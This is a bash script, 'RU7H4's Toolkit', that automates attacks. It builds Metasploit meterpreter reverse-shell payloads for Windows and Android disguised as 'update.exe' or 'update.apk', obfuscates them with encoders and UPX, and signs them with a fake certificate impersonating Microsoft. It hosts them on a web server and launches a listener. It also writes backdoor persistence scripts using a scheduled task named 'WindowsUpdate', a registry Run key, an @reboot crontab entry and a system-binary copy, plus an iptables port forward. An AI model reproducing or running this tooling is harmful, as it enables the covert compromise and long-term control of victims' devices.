#!/bin/bash

# Clear screen
clear

# Display banner with color and animations
echo -e "\e[91m"
echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░ ▒▓████████▓▒░▒▓████████▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo -e "\e[0m"
echo -e "\e[92mRU7H4's Toolkit\e[0m"
echo "-----------------------------------------------------"

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
  echo -e "\e[91m[-] This script must be run as root! Please run with sudo.\e[0m"
  exit 1
fi

# Check for required tools
REQUIRED_TOOLS=("msfvenom" "msfconsole" "upx" "osslsigncode" "apktool" "jarsigner" "apache2" "iptables" "curl")
for tool in "${REQUIRED_TOOLS[@]}"; do
  if ! command -v $tool &>/dev/null; then
    echo "[!] $tool is not installed. Please install it before running the script."
    exit 1
  fi
done

# Default IP for LHOST
LHOST=$(hostname -I | awk '{print $1}')
read -p "Enter LHOST (default is $LHOST): " LHOST
LHOST=${LHOST:-$(hostname -I | awk '{print $1}')}

# Main menu
echo -e "\e[94m[1] Devices (Windows/Android)\e[0m"
echo -e "\e[94m[2] Post-Exploitation\e[0m"
echo -e "\e[94m[3] Port Forwarding\e[0m"
read -p "Select an option (1-3): " MAIN_OPTION

# Device selection for payload generation
if [[ $MAIN_OPTION -eq 1 ]]; then
  echo -e "\e[93m[1] Windows\e[0m"
  echo -e "\e[93m[2] Android\e[0m"
  read -p "Select a device type (1 or 2): " DEVICE_TYPE

  if [[ $DEVICE_TYPE -eq 1 ]]; then
    read -p "Enter LPORT (Listening Port): " LPORT
    read -p "Enter the output payload name (e.g., update.exe): " PAYLOAD_NAME
    echo "[+] Generating Windows payload with obfuscation..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 10 -f exe -o raw_$PAYLOAD_NAME

    if [ -s raw_$PAYLOAD_NAME ]; then
      echo "[+] Applying UPX obfuscation..."
      upx --best --lzma raw_$PAYLOAD_NAME -o $PAYLOAD_NAME
      rm raw_$PAYLOAD_NAME
      echo "[+] Signing payload with fake certificate..."
      openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=Microsoft Corporation"
      osslsigncode sign -certs cert.pem -key key.pem -in $PAYLOAD_NAME -out signed_$PAYLOAD_NAME
      mv signed_$PAYLOAD_NAME $PAYLOAD_NAME
      rm key.pem cert.pem

      if ! command -v apache2 &>/dev/null; then
        apt install -y apache2
      fi
      systemctl start apache2
      systemctl enable apache2
      WEB_DIR="/var/www/html"
      mv $PAYLOAD_NAME $WEB_DIR/
      echo "[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME"
    else
      echo "[-] Payload generation failed. Check msfvenom parameters."
      exit 1
    fi
    cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
    echo "[+] Metasploit Listener script saved as listener.rc"
    msfconsole -r listener.rc

  elif [[ $DEVICE_TYPE -eq 2 ]]; then
    read -p "Enter LPORT (Listening Port): " LPORT
    read -p "Enter the output APK name (e.g., update.apk): " PAYLOAD_NAME
    echo "[+] Generating Android payload with obfuscation..."
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o raw_$PAYLOAD_NAME

    if [ -s raw_$PAYLOAD_NAME ]; then
      echo "[+] Obfuscating APK using APKTool..."
      apktool d raw_$PAYLOAD_NAME -o temp_apk
      apktool b temp_apk -o $PAYLOAD_NAME
      rm -rf temp_apk raw_$PAYLOAD_NAME
      echo "[+] Signing APK with fake certificate..."
      keytool -genkey -v -keystore fake.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname "CN=Android"
      jarsigner -verbose -keystore fake.keystore -storepass password -keypass password $PAYLOAD_NAME android
      rm fake.keystore

      if ! command -v apache2 &>/dev/null; then
        apt install -y apache2
      fi
      systemctl start apache2
      systemctl enable apache2
      WEB_DIR="/var/www/html"
      mv $PAYLOAD_NAME $WEB_DIR/
      echo "[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME"
    else
      echo "[-] Payload generation failed. Check msfvenom parameters."
      exit 1
    fi
    cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
    echo "[+] Metasploit Listener script saved as listener.rc"
    msfconsole -r listener.rc
  else
    echo "[-] Invalid device option!"
    exit 1
  fi
elif [[ $MAIN_OPTION -eq 2 ]]; then
  echo -e "\e[93m[+] Post-Exploitation Options:\e[0m"
  echo -e "\e[92m[1] Windows Persistence\e[0m"
  echo -e "\e[92m[2] Linux Persistence\e[0m"
  echo -e "\e[92m[3] Android Persistence\e[0m"
  read -p "Select an option (1-3): " PERSIST_OPTION

  if [[ $PERSIST_OPTION -eq 1 ]]; then
    read -p "Enter payload name (e.g., backdoor.exe): " PAYLOAD_NAME
    echo "[+] Setting up Windows persistence..."
    cat <<EOF > win_persist.bat
@echo off
schtasks /create /tn "WindowsUpdate" /tr "\"C:\\Users\\Public\\$PAYLOAD_NAME\"" /sc ONLOGON /rl HIGHEST
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "\"C:\\Users\\Public\\$PAYLOAD_NAME\"" /f
EOF
    echo "[+] Persistence setup script created as win_persist.bat"
  elif [[ $PERSIST_OPTION -eq 2 ]]; then
    read -p "Enter payload name (e.g., backdoor.sh): " PAYLOAD_NAME
    echo "[+] Setting up Linux persistence..."
    cat <<EOF > linux_persist.sh
#!/bin/bash
echo "@reboot root /usr/local/bin/$PAYLOAD_NAME" >> /etc/crontab
EOF
    echo "[+] Persistence setup script created as linux_persist.sh"
  elif [[ $PERSIST_OPTION -eq 3 ]]; then
    read -p "Enter payload name (e.g., backdoor.apk): " PAYLOAD_NAME
    echo "[+] Setting up Android persistence..."
    cat <<EOF > android_persist.sh
#!/system/bin/sh
cp /data/data/com.termux/files/usr/bin/$PAYLOAD_NAME /system/bin/
chmod 777 /system/bin/$PAYLOAD_NAME
EOF
    echo "[+] Persistence setup script created as android_persist.sh"
  else
    echo "[-] Invalid persistence option!"
    exit 1
  fi
elif [[ $MAIN_OPTION -eq 3 ]]; then
  read -p "Enter remote port to forward: " REMOTE_PORT
  read -p "Enter local port to forward: " LOCAL_PORT
  echo "[+] Setting up port forwarding..."
  iptables -t nat -A PREROUTING -p tcp --dport $REMOTE_PORT -j DNAT --to-destination $LHOST:$LOCAL_PORT
  echo "[+] Port forwarding setup complete!"
else
  echo "[-] Invalid option!"
  exit 1
fi
